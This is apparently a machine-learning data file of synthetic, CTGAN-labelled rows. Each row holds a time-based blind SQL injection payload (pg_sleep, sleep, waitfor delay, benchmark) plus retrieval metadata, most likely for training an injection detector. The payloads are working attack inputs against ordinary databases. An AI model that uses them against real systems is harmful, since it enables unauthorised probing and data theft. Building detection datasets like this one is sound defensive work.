id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000177,attack,time,1'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000700,4.921955845578284
CTGAN_000178,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,5.8342091453219425
CTGAN_000179,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,6.863668763492749
CTGAN_000180,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,5.977764642575533
CTGAN_000181,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,4.564406584328095
CTGAN_000182,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,7.157661477494727
CTGAN_000183,attack,time,"1""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""cowu"" like ""cowu",nearest_attack_euclidean,R000461,5.545606253954839
CTGAN_000184,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000175,4.142036488559673
CTGAN_000185,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""hvic"" like ""hvic",nearest_attack_euclidean,R000556,7.494952856228911
CTGAN_000186,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,4.74770012843536
CTGAN_000187,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""mfro"" like ""mfro",nearest_attack_euclidean,R000268,6.119906694023162
CTGAN_000188,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'egnv' like 'egnv",nearest_attack_euclidean,R000416,6.6822270684855365
CTGAN_000189,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   +',nearest_attack_euclidean,R000773,4.539788265217468
CTGAN_000190,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,nearest_attack_euclidean,R000184,6.862998993288623
CTGAN_000191,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  6824  =  6824,nearest_attack_euclidean,R000511,7.545735961584963
CTGAN_000192,attack,time,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  -- saxs,nearest_attack_euclidean,R000421,6.190554450116829
CTGAN_000193,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",nearest_attack_euclidean,R000562,6.928127298068326
CTGAN_000194,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,nearest_attack_euclidean,R000230,6.685219519184737
CTGAN_000195,attack,time,"1'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000612,7.662175913707721
CTGAN_000196,attack,time,"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",nearest_attack_euclidean,R000246,6.2884401056050026
CTGAN_000197,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,6.993665563919807
CTGAN_000198,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000590,5.184040741670726
CTGAN_000199,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000211,6.324689645311305
CTGAN_000200,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,7.3950692435224035
CTGAN_000201,attack,time,"1%""   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000736,5.7174567744990075
CTGAN_000202,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R000112,7.226976167567979
CTGAN_000203,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000279,6.118632974953894
CTGAN_000204,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,5.78514415704212
CTGAN_000205,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,6.187096392163914
CTGAN_000206,attack,time,1' where 1153  =  1153 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R000388,4.78667811108551
CTGAN_000207,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,5.275264005471336
CTGAN_000208,attack,time,1  )   where 9821  =  9821 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000681,3.954118660747017
CTGAN_000209,attack,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000633,6.980623139906278
CTGAN_000210,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.687208403977266
CTGAN_000211,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,3.928135101306388
CTGAN_000212,attack,time,1'||  (  select 'xqqp' where 3007  =  3007 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000339,5.681932530176213
CTGAN_000213,attack,time,"1""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""iuxs"" like ""iuxs",nearest_attack_euclidean,R000639,7.412822279029148
CTGAN_000214,attack,time,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,nearest_attack_euclidean,R000308,5.942855898609189
CTGAN_000215,attack,time,"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",nearest_attack_euclidean,R000663,6.365382350360791
CTGAN_000216,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,7.276613536115533
CTGAN_000217,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,6.591118743631141
CTGAN_000218,attack,time,"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",nearest_attack_euclidean,R000486,6.15623712223038
CTGAN_000219,attack,time,"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000563,6.020348677848959
CTGAN_000220,attack,time,1  )   rlike sleep  (  5  )   and   (  5724  =  5724,nearest_attack_euclidean,R000410,5.103157155241279
CTGAN_000221,attack,time,"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""ipqw"" like ""ipqw",nearest_attack_euclidean,R000186,9.287413693629674
CTGAN_000222,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,5.889714827009566
CTGAN_000223,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,6.777959929070559
CTGAN_000224,attack,time,1   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   3069  =  3069,nearest_attack_euclidean,R000411,5.886939443613328
CTGAN_000225,attack,time,1'+  (  select iowv where 6105  =  6105 and sleep  (  5  )  #,nearest_attack_euclidean,R000546,7.094096107458782
CTGAN_000226,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000211,7.376723772162612
CTGAN_000227,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,7.545929637643177
CTGAN_000228,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000211,6.244640893068641
CTGAN_000229,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000632,5.335570176415673
CTGAN_000230,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,6.924721553592559
CTGAN_000231,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   4982  =  4982,nearest_attack_euclidean,R000535,5.843957802840806
CTGAN_000232,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,5.569419047929154
CTGAN_000233,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,5.378671598990789
CTGAN_000234,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,5.23518499548231
CTGAN_000235,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,6.110677938164602
CTGAN_000236,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000608,7.192019476902898
CTGAN_000237,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",nearest_attack_euclidean,R000457,6.817262821322161
CTGAN_000238,attack,time,1   )    )    as skex where 7941  =  7941 and sleep  (  5  )  --,nearest_attack_euclidean,R000644,4.520675425091859
CTGAN_000239,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000227,7.531174016696513
CTGAN_000240,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,5.13224590848054
CTGAN_000241,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   +',nearest_attack_euclidean,R000773,6.486847316693018
CTGAN_000242,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000590,6.489533116077645
CTGAN_000243,attack,time,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""dplf"" like ""dplf",nearest_attack_euclidean,R000280,7.544770284076499
CTGAN_000244,attack,time,1' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000599,7.432726958276492
CTGAN_000245,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.069801754354703
CTGAN_000246,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,5.75728474929144
CTGAN_000247,attack,time,1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and '%'  =  ',nearest_attack_euclidean,R000434,6.183764114697482
CTGAN_000248,attack,time,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",nearest_attack_euclidean,R000564,6.141173487565725
CTGAN_000249,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000379,5.66757367364291
CTGAN_000250,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000206,6.29240210586746
CTGAN_000251,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000206,6.141123587893202
CTGAN_000252,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,5.29082621691723
CTGAN_000253,attack,time,""" or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000040,8.398391913851809
CTGAN_000254,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000286,4.285153810151137
CTGAN_000255,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,7.3125579165346055
CTGAN_000256,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000341,5.431301854368227
CTGAN_000257,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000590,3.776407146638919
CTGAN_000258,attack,time,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   -- ilfc",nearest_attack_euclidean,R000187,6.500455551522021
CTGAN_000259,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,nearest_attack_euclidean,R000184,6.47273620496317
CTGAN_000260,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,nearest_attack_euclidean,R000184,5.31810251595242
CTGAN_000261,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000279,9.173067432484885
CTGAN_000262,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000157,6.565778492261137
CTGAN_000263,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,nearest_attack_euclidean,R000482,5.991308559761391
CTGAN_000264,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000481,8.08613708106893
CTGAN_000265,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000608,6.940303450135809
CTGAN_000266,attack,time,"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'udvq'  =  'udvq",nearest_attack_euclidean,R000678,6.180257032512144
CTGAN_000267,attack,time,select pg_sleep  (  5  )   and    (    (   4382  =  4382,nearest_attack_euclidean,R000419,5.993508277255671
CTGAN_000268,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000645,8.377530438046275
CTGAN_000269,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000146,4.687081923147429
CTGAN_000270,attack,time,1'+  (  select 'sfko' where 6853  =  6853 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000338,7.1199617149158465
CTGAN_000271,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,6.599065867173037
CTGAN_000272,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  6824  =  6824,nearest_attack_euclidean,R000511,6.228918593867854
CTGAN_000273,attack,time,"1""   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000697,7.0066707861744595
CTGAN_000274,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,5.409353100028597
CTGAN_000275,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,8.884634146202677
CTGAN_000276,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,nearest_attack_euclidean,R000554,4.455344199472314
CTGAN_000277,attack,time,1'  )   and sleep  (  5  )   and   (  'njud'  =  'njud,nearest_attack_euclidean,R000352,6.040335058114633
CTGAN_000278,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000310,5.855215213546312
CTGAN_000279,attack,time,"1%""   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000736,4.24206060022391
CTGAN_000280,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000279,6.1609022458504485
CTGAN_000281,attack,time,1'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000700,5.2228940151932735
CTGAN_000282,attack,time,"1""   )    )    as daqd where 4390  =  4390 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000311,5.502920783525847
CTGAN_000283,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,4.9790671316078114
CTGAN_000284,attack,time,"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",nearest_attack_euclidean,R000486,5.539077676470411
CTGAN_000285,attack,time,select pg_sleep  (  5  )   and    (    (   4382  =  4382,nearest_attack_euclidean,R000419,5.227860999550173
CTGAN_000286,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,nearest_attack_euclidean,R000094,6.939583964003289
CTGAN_000287,attack,time,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000203,5.992904266611662
CTGAN_000288,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,6.777247826759879
CTGAN_000289,attack,time,"1 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000224,5.244280405277419
CTGAN_000290,attack,time,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""dplf"" like ""dplf",nearest_attack_euclidean,R000280,6.196465545697315
CTGAN_000291,attack,time,"1""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""cowu"" like ""cowu",nearest_attack_euclidean,R000461,5.150131435625475
CTGAN_000292,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.871499639203265
CTGAN_000293,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'tmbs'  =  'tmbs",nearest_attack_euclidean,R000772,7.754093025269366
CTGAN_000294,attack,time,"1""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""cowu"" like ""cowu",nearest_attack_euclidean,R000461,5.733032136901377
CTGAN_000295,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000288,5.779144320657542
CTGAN_000296,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,6.573090977668642
CTGAN_000297,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,7.282942054352821
CTGAN_000298,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000341,5.436050851415456
CTGAN_000299,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,6.6145311827010715
CTGAN_000300,attack,time,1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000451,6.201307980959455
CTGAN_000301,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000206,5.092456181902817
CTGAN_000302,attack,time,"waitfor delay '0:0:5' and   (  ""%""  =  """,nearest_attack_euclidean,R000456,7.967823050979281
CTGAN_000303,attack,time,select sleep  (  5  )   and    (    (   'ilcv'  =  'ilcv,nearest_attack_euclidean,R000364,6.26837720004158
CTGAN_000304,attack,time,1'+  (  select 'diet' where 7004  =  7004 rlike sleep  (  5   )    )   +',nearest_attack_euclidean,R000764,6.372123113255422
CTGAN_000305,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,nearest_attack_euclidean,R000094,3.555402929060549
CTGAN_000306,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,5.433633244091051
CTGAN_000307,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000227,4.709435096753419
CTGAN_000308,attack,time,select sleep  (  5  )   and    (    (   'ilcv'  =  'ilcv,nearest_attack_euclidean,R000364,8.957527659930875
CTGAN_000309,attack,time,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,nearest_attack_euclidean,R000418,4.346210670027098
CTGAN_000310,attack,time,1   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   3069  =  3069,nearest_attack_euclidean,R000411,5.386559531834711
CTGAN_000311,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000244,6.743062646070893
CTGAN_000312,attack,time,1%'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000614,6.904497728354577
CTGAN_000313,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,6.837205956095149
CTGAN_000314,attack,time, (  select   (  case when   (  9856  =  9856  )   then sleep  (  5  )   else 9856*  (  select 9856 from information_schema.character_sets  )   end   )    ) ,nearest_attack_euclidean,R000132,8.993600445196494
CTGAN_000315,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000379,7.431540339944307
CTGAN_000316,attack,time,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000582,7.225068702533907
CTGAN_000317,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,7.1956463307865945
CTGAN_000318,attack,time,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,nearest_attack_euclidean,R000418,6.226676846595642
CTGAN_000319,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,5.37004986874354
CTGAN_000320,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""fzlr""  =  ""fzlr",nearest_attack_euclidean,R000366,5.042870214386646
CTGAN_000321,attack,time,1'  )   rlike sleep  (  5  )   and   (  'qsub' like 'qsub,nearest_attack_euclidean,R000779,6.023145861012628
CTGAN_000322,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,7.397591406549609
CTGAN_000323,attack,time,1   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   3069  =  3069,nearest_attack_euclidean,R000411,5.341388459294691
CTGAN_000324,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,5.244487485951169
CTGAN_000325,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000525,7.734465329956989
CTGAN_000326,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,nearest_attack_euclidean,R000230,4.265524310239415
CTGAN_000327,attack,time,1'  )   and sleep  (  5  )   and   (  'orxt'  =  'orxt,nearest_attack_euclidean,R000499,6.372622913143164
CTGAN_000328,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000341,7.122682699582778
CTGAN_000329,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,4.996234942945239
CTGAN_000330,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000590,5.930047389346596
CTGAN_000331,attack,time,select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,nearest_attack_euclidean,R000378,5.820238967855507
CTGAN_000332,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000761,7.143661841371424
CTGAN_000333,attack,time,"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",nearest_attack_euclidean,R000486,7.4832489250069605
CTGAN_000334,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmy""  =  ""twmy",nearest_attack_euclidean,R000082,6.057158333396721
CTGAN_000335,attack,time," select sleep  (  5  )   and   (  ""tlbp""  =  ""tlbp",nearest_attack_euclidean,R000229,6.674896188393707
CTGAN_000336,attack,time,1  )   where 6950  =  6950 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000585,7.536671226592675
CTGAN_000337,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000146,5.103570039898019
CTGAN_000338,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,5.970410063206156
CTGAN_000339,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000276,5.773370399166624
CTGAN_000340,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'gfpd'  =  'gfpd",nearest_attack_euclidean,R000141,5.714196078337869
CTGAN_000341,attack,time,select sleep  (  5  )   and    (    (   'srfc' like 'srfc,nearest_attack_euclidean,R000204,4.2972936024237
CTGAN_000342,attack,time,1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl,nearest_attack_euclidean,R000495,4.469989817367259
CTGAN_000343,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,6.7762470028468025
CTGAN_000344,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,8.282167218514957
CTGAN_000345,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk",nearest_attack_euclidean,R000261,5.6574235439295455
CTGAN_000346,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000365,4.7397137396113145
CTGAN_000347,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""mfro"" like ""mfro",nearest_attack_euclidean,R000268,5.782877106860995
CTGAN_000348,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,5.168385223528174
CTGAN_000349,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000761,6.435442648332739
CTGAN_000350,attack,time,1%'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000373,6.566464667924099
CTGAN_000351,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000279,5.362888608959288
CTGAN_000352,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000731,7.17907860878397
